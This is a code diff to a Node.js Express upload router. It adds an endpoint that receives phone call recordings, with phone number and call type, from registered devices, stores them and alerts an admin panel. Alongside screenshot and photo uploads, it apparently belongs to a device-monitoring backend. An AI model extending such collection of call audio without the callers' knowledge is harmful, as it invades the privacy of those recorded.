@@ -8,7 +8,7 @@ const { v4: uuidv4 } = require('uuid');
 const router = express.Router();
 
 // Ensure upload directories exist
-const uploadDirs = ['screenshots', 'photos', 'files'];
+const uploadDirs = ['screenshots', 'photos', 'files', 'recordings'];
 uploadDirs.forEach(dir => {
     const fullPath = path.join(__dirname, '../../uploads', dir);
     if (!fs.existsSync(fullPath)) {
@@ -40,6 +40,23 @@ const upload = multer({
             cb(null, true);
         } else {
             cb(new Error('Invalid file type'));
+        }
+    }
+});
+
+// Separate multer config for large audio recordings (100MB limit)
+const recordingUpload = multer({
+    storage,
+    limits: { fileSize: 100 * 1024 * 1024 }, // 100MB limit for recordings
+    fileFilter: (req, file, cb) => {
+        // Accept audio file types
+        const allowedTypes = /mp3|mp4|m4a|aac|wav|ogg|3gp|amr|audio/;
+        const extname = allowedTypes.test(path.extname(file.originalname).toLowerCase());
+        const mimetype = allowedTypes.test(file.mimetype);
+        if (extname || mimetype) {
+            cb(null, true);
+        } else {
+            cb(new Error('Invalid audio file type'));
         }
     }
 });
@@ -225,6 +242,94 @@ router.post('/file', (req, res, next) => {
     } catch (error) {
         console.error('[UPLOAD] File error:', error);
         res.status(500).json({ success: false, error: 'Failed to upload file' });
+    }
+});
+
+/**
+ * POST /api/upload/recording
+ * Upload call recording from device (multipart - streams file, no OOM)
+ */
+router.post('/recording', (req, res, next) => {
+    req.uploadType = 'recordings';
+    next();
+}, recordingUpload.single('file'), async (req, res) => {
+    try {
+        const { deviceId, metadataId, phoneNumber, callType, duration } = req.body;
+
+        if (!deviceId) {
+            return res.status(400).json({ success: false, error: 'Device ID required' });
+        }
+
+        const device = await findDevice(deviceId);
+        if (!device) {
+            return res.status(404).json({ success: false, error: 'Device not found' });
+        }
+
+        if (!req.file) {
+            return res.status(400).json({ success: false, error: 'No file uploaded' });
+        }
+
+        const filePath = `/uploads/recordings/${req.file.filename}`;
+        const fileSize = req.file.size;
+
+        // If metadataId is provided, update existing recording record
+        if (metadataId) {
+            try {
+                await prisma.callRecording.update({
+                    where: { id: metadataId },
+                    data: {
+                        filePath: filePath,
+                        fileSize: fileSize,
+                        status: 'completed'
+                    }
+                });
+                console.log(`[UPLOAD] Recording updated: ${metadataId} -> ${filePath}`);
+            } catch (err) {
+                console.warn(`[UPLOAD] Could not update recording ${metadataId}:`, err.message);
+            }
+        } else {
+            // Create new recording record
+            try {
+                await prisma.callRecording.create({
+                    data: {
+                        deviceId: device.id,
+                        phoneNumber: phoneNumber || '',
+                        callType: callType || 'unknown',
+                        duration: parseInt(duration) || 0,
+                        filePath: filePath,
+                        fileSize: fileSize,
+                        status: 'completed'
+                    }
+                });
+                console.log(`[UPLOAD] New recording created: ${filePath}`);
+            } catch (err) {
+                console.warn(`[UPLOAD] Could not create recording record:`, err.message);
+            }
+        }
+
+        // Emit to admin panel
+        const io = req.app.get('io');
+        if (io) {
+            io.to('admin').emit('recording:uploaded', {
+                deviceId,
+                metadataId,
+                filePath,
+                fileSize,
+                phoneNumber,
+                callType
+            });
+        }
+
+        console.log(`[UPLOAD] Recording from ${deviceId}: ${req.file.filename} (${(fileSize / 1024 / 1024).toFixed(2)} MB)`);
+        res.json({
+            success: true,
+            filePath: filePath,
+            filename: req.file.filename,
+            size: fileSize
+        });
+    } catch (error) {
+        console.error('[UPLOAD] Recording error:', error);
+        res.status(500).json({ success: false, error: 'Failed to upload recording' });
     }
 });
 
